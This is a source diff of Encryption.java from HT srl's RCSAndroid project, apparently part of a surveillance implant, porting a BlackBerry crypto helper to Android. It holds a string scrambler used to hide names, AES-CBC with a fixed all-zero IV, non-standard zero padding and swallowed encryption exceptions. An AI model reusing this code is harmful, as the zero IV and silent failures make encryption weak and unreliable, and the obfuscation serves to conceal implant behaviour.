@@ -1,32 +1,39 @@
+/* *******************************************
+ * Copyright (c) 2011
+ * HT srl,   All rights reserved.
+ * Project      : RCS, RCSAndroid
+ * File         : Encryption.java
+ * Created      : Apr 9, 2011
+ * Author		: zeno
+ * *******************************************/
 package com.ht.RCSAndroidGUI.crypto;
 
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
-import java.util.Arrays;
+
+import javax.crypto.NoSuchPaddingException;
+
+import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Debug;
-import com.ht.RCSAndroidGUI.action.sync.CommandException;
 import com.ht.RCSAndroidGUI.utils.Check;
 import com.ht.RCSAndroidGUI.utils.Utils;
 
-//#preprocess
-/* *************************************************
- * Copyright (c) 2010 - 2010
- * HT srl,   All rights reserved.
- * Project      : RCS, RCSBlackBerry_lib
- * File         : Encryption.java
- * Created      : 26-mar-2010
- * *************************************************/
+// TODO: Auto-generated Javadoc
 
 /**
  * The Class Encryption.
  */
 public class Encryption {
 
-	// #ifdef DEBUG
-	private static Debug debug = new Debug("Encryption");
+	/** The Constant TAG. */
+	private static final String TAG = "Encryption";
+	/**
+	 * Inits the.
+	 */
+	public static void init() {
 
-	// #endif
+	}
 
 	/**
 	 * Descrambla una stringa, torna il puntatore al nome descramblato. La
@@ -53,6 +60,7 @@ public class Encryption {
 	 * @return the string
 	 */
 	public static String encryptName(final String Name, final int seed) {
+		// Log.d(TAG, "seed : " + seed);
 		return scramble(Name, seed, true);
 	}
 
@@ -63,17 +71,11 @@ public class Encryption {
 	 *            the len
 	 * @return the next multiple
 	 */
-	public static int getNextMultiple(final int len) {
-		// #ifdef DBC
+	public int getNextMultiple(final int len) {
 		Check.requires(len >= 0, "len < 0");
-		// #endif
 		final int newlen = len + (len % 16 == 0 ? 0 : 16 - len % 16);
-		// #ifdef DBC
 		Check.ensures(newlen >= len, "newlen < len");
-		// #endif
-		// #ifdef DBC
 		Check.ensures(newlen % 16 == 0, "Wrong newlen");
-		// #endif
 		return newlen;
 	}
 
@@ -82,6 +84,14 @@ public class Encryption {
 	 * alla nuova stringa. Il primo parametro e' la stringa da de/scramblare, il
 	 * secondo UN byte di seed, il terzo se settato a TRUE scrambla, se settato
 	 * a FALSE descrambla.
+	 * 
+	 * @param name
+	 *            the name
+	 * @param seed
+	 *            the seed
+	 * @param enc
+	 *            the enc
+	 * @return the string
 	 */
 	private static String scramble(final String name, int seed,
 			final boolean enc) {
@@ -108,11 +118,7 @@ public class Encryption {
 		if (seed == 0) {
 			seed = 1;
 		}
-
-		// #ifdef DBC
 		Check.asserts(seed > 0, "negative seed");
-		// #endif
-
 		for (i = 0; i < len; i++) {
 			for (j = 0; j < alphabetLen; j++) {
 				if (retString[i] == alphabet[j]) {
@@ -132,52 +138,35 @@ public class Encryption {
 		return new String(retString);
 	}
 
+	/** The crypto. */
 	Crypto crypto;
-
-	boolean keyReady = false;
-
-	/**
-	 * Inits the.
-	 */
-	public static void init() {
-
-	}
-
-	/**
-	 * Calcola il SHA1 del messaggio, usando la crypto api.
-	 * 
-	 * @param message
-	 *            the message
-	 * @return the byte[]
-	 */
-	public static byte[] SHA1(final byte[] message, int offset, int length) {
-		MessageDigest digest;
-		try {
-			digest = MessageDigest.getInstance("SHA-1");
-			digest.update(message, offset, length);
-			final byte[] sha1 = digest.digest();
-
-			return sha1;
-		} catch (NoSuchAlgorithmException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
-		return null;
-	}
-
-	public static byte[] SHA1(final byte[] message) {
-		return SHA1(message, 0, message.length);
-	}
 
 	/**
 	 * Instantiates a new encryption.
+	 * 
+	 * @param key
+	 *            the key
 	 */
-	public Encryption(byte[] key) {
+	public Encryption(final byte[] key) {
 		makeKey(key);
 	}
-	
-	public void makeKey(byte[] key) {
-		crypto = new Crypto(key);
+
+	/**
+	 * Make key.
+	 * 
+	 * @param key
+	 *            the key
+	 */
+	public void makeKey(final byte[] key) {
+		try {
+			crypto = new Crypto(key);
+		} catch (final NoSuchAlgorithmException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (final NoSuchPaddingException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 	}
 
 	/**
@@ -187,6 +176,7 @@ public class Encryption {
 	 *            the cyphered
 	 * @return the byte[]
 	 * @throws CryptoException
+	 *             the crypto exception
 	 */
 	public byte[] decryptData(final byte[] cyphered) throws CryptoException {
 		return decryptData(cyphered, cyphered.length, 0);
@@ -201,6 +191,7 @@ public class Encryption {
 	 *            the offset
 	 * @return the byte[]
 	 * @throws CryptoException
+	 *             the crypto exception
 	 */
 	public byte[] decryptData(final byte[] cyphered, final int offset)
 			throws CryptoException {
@@ -218,17 +209,13 @@ public class Encryption {
 	 *            the offset
 	 * @return the byte[]
 	 * @throws CryptoException
+	 *             the crypto exception
 	 */
 	public byte[] decryptData(final byte[] cyphered, final int plainlen,
 			final int offset) throws CryptoException {
 		final int enclen = cyphered.length - offset;
-
-		// #ifdef DBC
-		Check.requires(keyReady, "Key not ready");
 		Check.requires(enclen % 16 == 0, "Wrong padding");
 		Check.requires(enclen >= plainlen, "Wrong plainlen");
-		// #endif
-
 		final byte[] plain = new byte[plainlen];
 		byte[] iv = new byte[16];
 
@@ -245,86 +232,151 @@ public class Encryption {
 
 			if ((i + 1 >= numblock) && (lastBlockLen != 0)) { // last turn
 				// and remaind
-				// #ifdef DEBUG
-				debug.trace("lastBlockLen: " + lastBlockLen);
-				// #endif
-				Utils.copy(plain, i * 16, pt, 0, lastBlockLen);
+				Log.d(TAG,"lastBlockLen: " + lastBlockLen);
+				System.arraycopy(pt, 0, plain, i * 16, lastBlockLen);
 			} else {
-				Utils.copy(plain, i * 16, pt, 0, 16);
+				System.arraycopy(pt, 0, plain, i * 16, 16);
 				// copyblock(plain, i, pt, 0);
 			}
 		}
-
-		// #ifdef DBC
 		Check.ensures(plain.length == plainlen, "wrong plainlen");
-		// #endif
 		return plain;
 	}
 
-	public byte[] encryptData(final byte[] plain) {
-		return encryptData(plain, 0);
-	}
-
 	/**
-	 * Encrypt data in CBC mode and HT padding
+	 * Encrypt data.
 	 * 
 	 * @param plain
 	 *            the plain
 	 * @return the byte[]
 	 */
-	public byte[] encryptData(final byte[] plain, int offset) {
-		// #ifdef DBC
-		Check.requires(keyReady, "Key not ready");
-		// #endif
+	public byte[] encryptData(final byte[] plain) {
+		return encryptData(plain, 0);
+	}
+
+	/**
+	 * Encrypt data in CBC mode and HT padding.
+	 * 
+	 * @param plain
+	 *            the plain
+	 * @param offset
+	 *            the offset
+	 * @return the byte[]
+	 */
+	public byte[] encryptData(final byte[] plain, final int offset) {
 
 		final int len = plain.length - offset;
 
 		// TODO: optimize, non creare padplain, considerare caso particolare
 		// ultimo blocco
 		final byte[] padplain = pad(plain, offset, len);
-
 		final int clen = padplain.length;
+
+		Check.asserts(clen % 16 == 0, "Wrong padding");
 		final byte[] crypted = new byte[clen];
 
 		byte[] iv = new byte[16]; // iv e' sempre 0
-		final byte[] ct = new byte[16];
+		byte[] ct;
 
 		final int numblock = clen / 16;
 		for (int i = 0; i < numblock; i++) {
 			final byte[] pt = Utils.copy(padplain, i * 16, 16);
 			xor(pt, iv);
 
-			crypto.encrypt(pt, ct);
-			Utils.copy(crypted, i * 16, ct, 0, 16);
-			iv = Utils.copy(ct);
+			try {
+				ct = crypto.encrypt(pt);
+				Check.asserts(ct.length == 16, "Wrong size");
+
+				System.arraycopy(ct, 0, crypted, i * 16, 16);
+				iv = Utils.copy(ct);
+			} catch (final Exception e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+
 		}
 
 		return crypted;
 	}
 
 	/**
-	 * Old style Pad, PKCS5 is available in EncryptionPKCS5
+	 * Calcola il SHA1 del messaggio, usando la crypto api.
+	 * 
+	 * @param message
+	 *            the message
+	 * @param offset
+	 *            the offset
+	 * @param length
+	 *            the length
+	 * @return the byte[]
+	 */
+	public static byte[] SHA1(final byte[] message, final int offset,
+			final int length) {
+		MessageDigest digest;
+		try {
+			digest = MessageDigest.getInstance("SHA-1");
+			digest.update(message, offset, length);
+			final byte[] sha1 = digest.digest();
+
+			return sha1;
+		} catch (final NoSuchAlgorithmException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return null;
+	}
+
+	/**
+	 * SH a1.
+	 * 
+	 * @param message
+	 *            the message
+	 * @return the byte[]
+	 */
+	public static byte[] SHA1(final byte[] message) {
+		return SHA1(message, 0, message.length);
+	}
+
+	/**
+	 * Old style Pad, PKCS5 is available in EncryptionPKCS5.
 	 * 
 	 * @param plain
+	 *            the plain
 	 * @param offset
+	 *            the offset
 	 * @param len
-	 * @return
+	 *            the len
+	 * @return the byte[]
 	 */
-	protected byte[] pad(byte[] plain, int offset, int len) {
+	protected byte[] pad(final byte[] plain, final int offset, final int len) {
 		return pad(plain, offset, len, false);
 	}
 
-	protected byte[] pad(byte[] plain, int offset, int len, boolean PKCS5) {
+	/**
+	 * Pad.
+	 * 
+	 * @param plain
+	 *            the plain
+	 * @param offset
+	 *            the offset
+	 * @param len
+	 *            the len
+	 * @param PKCS5
+	 *            the pKC s5
+	 * @return the byte[]
+	 */
+	protected byte[] pad(final byte[] plain, final int offset, final int len,
+			final boolean PKCS5) {
 		final int clen = getNextMultiple(len);
 		if (clen > 0) {
 			final byte[] padplain = new byte[clen];
 			if (PKCS5) {
-				int value = clen - len;
+				final int value = clen - len;
 				for (int i = 1; i <= value; i++) {
 					padplain[clen - i] = (byte) value;
 				}
 			}
-			Utils.copy(padplain, 0, plain, offset, len);
+			System.arraycopy(plain, offset, padplain, 0, len);
 			return padplain;
 		} else {
 			return plain;
@@ -340,20 +392,11 @@ public class Encryption {
 	 *            the iv
 	 */
 	void xor(final byte[] pt, final byte[] iv) {
-		// #ifdef DBC
 		Check.requires(pt.length == 16, "pt not 16 bytes long");
 		Check.requires(iv.length == 16, "iv not 16 bytes long");
-		// #endif
-
 		for (int i = 0; i < 16; i++) {
 			pt[i] ^= iv[i];
 		}
 	}
-
-	// COMPAT
-	public static Keys getKeys() {		
-		return Keys.self();
-	}
-
 
 }
